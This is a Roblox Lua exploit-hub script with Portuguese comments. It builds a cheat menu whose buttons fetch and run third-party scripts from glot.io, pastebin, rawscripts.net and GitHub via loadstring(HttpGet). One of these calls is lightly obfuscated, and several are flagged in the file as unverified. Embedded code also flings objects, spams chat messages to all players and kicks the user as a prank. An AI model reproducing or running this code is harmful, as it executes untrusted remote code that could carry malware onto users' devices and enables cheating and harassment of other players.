-- ID da imagem
local imageId = "rbxassetid://12869420933"

-- Serviços
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GUI principal
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DavidHub"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Botão do ícone (toggle)
local toggleButton = Instance.new("ImageButton")
toggleButton.Name = "ToggleButton"
toggleButton.Image = imageId
toggleButton.Size = UDim2.new(0, 60, 0, 60)
toggleButton.Position = UDim2.new(0, 10, 0.5, -30)
toggleButton.BackgroundTransparency = 1
toggleButton.Parent = screenGui

-- Frame do Hub
local hubFrame = Instance.new("Frame")
hubFrame.Name = "HubFrame"
hubFrame.Size = UDim2.new(0, 250, 0, 300)
hubFrame.Position = UDim2.new(0, 80, 0.5, -150)
hubFrame.BackgroundColor3 = Color3.fromRGB(27, 42, 53)
hubFrame.BackgroundTransparency = 0.2
hubFrame.BorderSizePixel = 0
hubFrame.Visible = false
hubFrame.Parent = screenGui

-- Título do Hub
local title = Instance.new("TextLabel")
title.Text = "davidgui hub"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.new(242, 243, 243)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 40)
title.Parent = hubFrame

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "rochips painel"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 0, 0, 60)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    if "you wanna use rochips universal" then
 local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
 local im,lonely,z_c=task.wait,game,loadstring
 z_c(lonely:HttpGet(z_z..""..z_x))()
 return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
end
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "painel fling"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 0, 0, 90)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/thuker-evader/Roblox/refs/heads/main/c00lkid%20gui"))()
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "david hub v8"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 0, 0, 120)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    local player = game.Players.LocalPlayer
repeat wait() until player:FindFirstChild("PlayerGui")

local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.Name = "DavidHub_FIXED"

-- Função de mensagens visuais (debug)
local function debugMSG(txt, y)
	local msg = Instance.new("TextLabel", gui)
	msg.Size = UDim2.new(1, 0, 0, 25)
	msg.Position = UDim2.new(0, 0, 0, y or 0)
	msg.Text = "[DEBUG] " .. txt
	msg.TextColor3 = Color3.fromRGB(0, 255, 0)
	msg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	msg.TextScaled = true
	msg.Font = Enum.Font.GothamBold
	game.Debris:AddItem(msg, 4)
end

debugMSG("David Hub FIXED iniciado", 0)

-- Botão flutuante
local openBtn = Instance.new("TextButton", gui)
openBtn.Size = UDim2.new(0, 70, 0, 70)
openBtn.Position = UDim2.new(0.5, -35, 0.9, -35)
openBtn.Text = "🧠"
openBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 60)
openBtn.TextColor3 = Color3.new(1,1,1)
openBtn.TextScaled = true
openBtn.Font = Enum.Font.GothamBold

-- Menu principal
local menu = Instance.new("Frame", gui)
menu.Size = UDim2.new(0, 330, 0, 300)
menu.Position = UDim2.new(0.5, -165, 0.5, -150)
menu.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
menu.BorderSizePixel = 0
menu.Visible = false

local titulo = Instance.new("TextLabel", menu)
titulo.Size = UDim2.new(1, 0, 0, 30)
titulo.Position = UDim2.new(0, 0, 0, 0)
titulo.Text = "David Hub V8 Lite 🧪"
titulo.TextColor3 = Color3.new(1, 1, 1)
titulo.BackgroundTransparency = 1
titulo.TextScaled = true
titulo.Font = Enum.Font.GothamBlack

-- Scroll horizontal de abas
local tabFrame = Instance.new("ScrollingFrame", menu)
tabFrame.Size = UDim2.new(1, 0, 0, 30)
tabFrame.Position = UDim2.new(0, 0, 0, 30)
tabFrame.CanvasSize = UDim2.new(0, 500, 0, 0)
tabFrame.ScrollBarThickness = 3
tabFrame.ScrollingDirection = Enum.ScrollingDirection.X
tabFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)

-- Área dos botões
local conteudo = Instance.new("Frame", menu)
conteudo.Size = UDim2.new(1, 0, 1, -60)
conteudo.Position = UDim2.new(0, 0, 0, 60)
conteudo.BackgroundTransparency = 1

local layout = Instance.new("UIListLayout", conteudo)
layout.Padding = UDim.new(0, 6)

-- Ativar/Desativar menu
openBtn.MouseButton1Click:Connect(function()
	menu.Visible = not menu.Visible
	debugMSG("Menu: " .. (menu.Visible and "Aberto" or "Fechado"), 30)
end)

-- Criador de Abas
local abas = {}
local nomesAbas = {"Fun", "Troll", "Extra"}

local function criarAba(nome, posX)
	local btn = Instance.new("TextButton", tabFrame)
	btn.Size = UDim2.new(0, 100, 0, 30)
	btn.Position = UDim2.new(0, posX, 0, 0)
	btn.Text = nome
	btn.BackgroundColor3 = Color3.fromRGB(40, 0, 60)
	btn.TextColor3 = Color3.new(1,1,1)
	btn.TextScaled = true
	btn.Font = Enum.Font.GothamBlack

	abas[nome] = {}
	btn.MouseButton1Click:Connect(function()
		for n, lista in pairs(abas) do
			for _, b in pairs(lista) do b.Visible = (n == nome) end
		end
		debugMSG("Aba ativada: " .. nome, 60)
	end)
end

-- Criador de botões
local function criarBotao(nomeAba, texto, func)
	local btn = Instance.new("TextButton", conteudo)
	btn.Size = UDim2.new(1, -20, 0, 40)
	btn.Text = texto
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.TextScaled = true
	btn.Font = Enum.Font.GothamBlack
	btn.Visible = false

	btn.MouseButton1Click:Connect(function()
		debugMSG("Clicado: " .. texto, 90)
		pcall(func)
	end)

	table.insert(abas[nomeAba], btn)
end

-- Criar abas
for i, nome in ipairs(nomesAbas) do
	criarAba(nome, (i - 1) * 105)
end

-- Criar botões por aba
criarBotao("Fun", "🌈 RGB Head", function()
	local char = player.Character
	while wait(0.1) do
		if not char or not char:FindFirstChild("Head") then break end
		char.Head.Color = Color3.new(math.random(), math.random(), math.random())
	end
end)

criarBotao("Fun", "🔁 Reset Player", function()
	local h = player.Character:FindFirstChildOfClass("Humanoid")
	if h then h.Health = 0 end
end)

criarBotao("Troll", "🧍 Criar Clone", function()
	local clone = player.Character:Clone()
	clone.Name = "David_Clone"
	for _, p in pairs(clone:GetDescendants()) do
		if p:IsA("BasePart") then p.Anchored = true end
	end
	clone.Parent = workspace
end)

criarBotao("Extra", "🌊 Nadar no Ar", function()
	local char = player.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local bv = Instance.new("BodyVelocity", hrp)
	bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
	bv.Velocity = Vector3.new(0, 50, 0)
	wait(3)
	bv:Destroy()
end)

-- Ativar primeira aba
for _, btn in pairs(abas["Fun"]) do btn.Visible = true end
debugMSG("Botões prontos! Use as abas", 120)

-- Fling de objetos soltos
criarBotao("Troll", "💣 Fling Objetos", function()
	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") and not obj.Anchored then
			local bv = Instance.new("BodyVelocity", obj)
			bv.Velocity = Vector3.new(math.random(-100,100), math.random(100,200), math.random(-100,100))
			bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
			game.Debris:AddItem(bv, 1)
		end
	end
end)

-- Zoom temporário na câmera
criarBotao("Extra", "🔍 Zoom Curto", function()
	local cam = workspace.CurrentCamera
	local originalFOV = cam.FieldOfView
	cam.FieldOfView = 20
	wait(2)
	cam.FieldOfView = originalFOV
end)

-- Mensagem no chat geral (visível pra todos)
criarBotao("Fun", "📢 Falar no Chat", function()
	local frases = {
		"David Hub V8 está entre nós 😈",
		"Brookhaven será modificado.",
		"Você ouviu isso?",
		"O script acordou.",
		"Isso não é um mod... é um vírus 👀"
	}
	local mensagem = frases[math.random(1, #frases)]
	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(mensagem, "All")
end)

-- Efeito surpresa visual
criarBotao("Extra", "🌈 Efeito de Tela", function()
	local efeito = Instance.new("ColorCorrectionEffect", game.Lighting)
	efeito.TintColor = Color3.fromRGB(255, 0, 255)
	efeito.Brightness = 0.2
	efeito.Saturation = 2
	wait(4)
	efeito:Destroy()
end)

-- Adicionar aba "Horror"
table.insert(nomesAbas, "Horror")
criarAba("Horror", #nomesAbas * 105 - 105)
abas["Horror"] = {}

-- Botão: Tela Glitchada
criarBotao("Horror", "📺 Modo Glitch", function()
	local blur = Instance.new("BlurEffect", game.Lighting)
	blur.Size = 24
	local cc = Instance.new("ColorCorrectionEffect", game.Lighting)
	cc.Saturation = -1
	cc.TintColor = Color3.fromRGB(255, 50, 50)
	wait(5)
	blur:Destroy()
	cc:Destroy()
end)

-- Botão: Sons aleatórios estranhos (não funciona se for mobile sem som)
criarBotao("Horror", "🔊 Sons Assustadores", function()
	local ids = {
		9123983453, -- som glitch
		1842228711, -- som grito
		130762736,  -- risada
	}
	local s = Instance.new("Sound", workspace)
	s.SoundId = "rbxassetid://" .. ids[math.random(1, #ids)]
	s.Volume = 5
	s:Play()
	game.Debris:AddItem(s, 5)
end)

-- Botão do Caos
criarBotao("Extra", "🎲 Botão do Caos", function()
	local acoes = {
		function() player.Character:BreakJoints() end,
		function() workspace.CurrentCamera.FieldOfView = math.random(10,120) end,
		function() player.Character.Humanoid.WalkSpeed = 100 end,
		function() player:Kick("Você clicou onde não devia...") end,
		function()
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("⚠️ Erro inesperado encontrado.", "All")
		end,
	}
	acoes[math.random(1, #acoes)]()
end)

-- Botão invisível (easter egg)
local easterEgg = Instance.new("TextButton", conteudo)
easterEgg.Size = UDim2.new(1, -20, 0, 5)
easterEgg.Position = UDim2.new(0, 10, 0, 200)
easterEgg.BackgroundTransparency = 1
easterEgg.TextTransparency = 1
easterEgg.Text = ""
easterEgg.Visible = true
easterEgg.MouseButton1Click:Connect(function()
	debugMSG("Easter Egg ativado.", 150)
	wait(0.5)
	player:Kick("Você descobriu o segredo... mas agora é tarde demais.")
end)
table.insert(abas["Horror"], easterEgg)

-- Ativar aba "Fun" novamente ao final
for _, b in pairs(abas["Fun"]) do b.Visible = true end
debugMSG("🔥 HUB COMPLETO! Parte 4 ativa!", 180)
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "r6/r15 changer"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 0, 0, 150)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    -- Made by Izekai

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local R6 = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

R6.Name = "R6"
R6.Parent = ScreenGui
R6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
R6.Position = UDim2.new(-0.000343383319, 0, 0.32815966, 0)
R6.Size = UDim2.new(0, 29, 0, 29)
R6.Font = Enum.Font.SourceSans
R6.Text = "R6"
R6.TextColor3 = Color3.fromRGB(0, 0, 0)
R6.TextSize = 14.000
R6.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
end)

TextButton.Parent = ScreenGui
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0, 0, 0.414634138, 0)
TextButton.Size = UDim2.new(0, 72, 0, 27)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Respawn"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000
TextButton.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/ukFZuXbb'),true))()
end)
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "ghost hub"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 0, 0, 170)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "fly gui"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 0, 0, 200)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()

    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "system broken"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 0, 0, 250)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Ragdoll-Engine-BEST-SCRIPT-WORKING-SystemBroken-7544"))()

    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "c00lgui reborn"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 200, 0, 30)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "c00lguiv1"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 200, 0, 0)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/cfsmi2/c00lguiv1/refs/heads/main/Main.lua", true))()
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "sandey xy"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 200, 0, 60)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/testUIDK/refs/heads/main/panel.lua"))()
    -- Aqui você pode executar outro script, função, etc.
end)

-- Exemplo de botão dentro do Hub
local actionButton = Instance.new("TextButton")
actionButton.Text = "forsaken"
actionButton.Font = Enum.Font.Gotham
actionButton.TextSize = 18
actionButton.TextColor3 = Color3.new(1, 1, 1)
actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
actionButton.Size = UDim2.new(0.8, 0, 0, 40)
actionButton.Position = UDim2.new(0.1, 500, 0, 60)
actionButton.Parent = hubFrame

-- Ação do botão do hub (pode mudar)
actionButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ago106/SpaceHub/refs/heads/main/loader.lua'))()
    -- Aqui você pode executar outro script, função, etc.
end)

-- Sistema Toggle do botão principal
local hubAberto = false
toggleButton.MouseButton1Click:Connect(function()
    hubAberto = not hubAberto
    hubFrame.Visible = hubAberto
end) 